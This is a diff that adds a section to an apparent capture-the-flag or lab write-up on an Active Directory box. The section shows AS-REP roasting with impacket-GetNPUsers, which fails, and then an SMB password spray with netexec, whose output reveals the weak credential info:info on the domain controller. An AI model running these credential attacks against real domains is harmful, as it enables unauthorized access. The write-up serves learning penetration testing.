@@ -220,6 +220,40 @@ Cool beans. We found two real users.
 Administrator
 INFO
 ```
+
+Asking our shiny chrome overlord `z.ai` for more advice, it suggests AS-REP Roasting.
+
+```sh
+echo "administrator" > users.txt
+echo "info" >> users.txt
+
+impacket-GetNPUsers hokkaido-aerospace.com/ -dc-ip 192.168.53.40 -usersfile users.txt
+# rip
+<<EOF
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User info doesn't have UF_DONT_REQUIRE_PREAUTH set
+EOF
+```
+
+Okay. So.
+
+```sh
+netexec smb 192.168.53.40 -u users.txt -p 'info'
+
+<<EOF
+???(kali?kali)-[~]
+??$ netexec smb 192.168.53.40 -u users.txt -p 'info'
+
+SMB         192.168.53.40   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.53.40   445    DC               [-] hokkaido-aerospace.com\administrator:info STATUS_LOGON_FAILURE
+SMB         192.168.53.40   445    DC               [+] hokkaido-aerospace.com\info:info 
+
+EOF
+```
+
+It's just `info:info`. Sweet!
+
+
 ## Root access
 
 
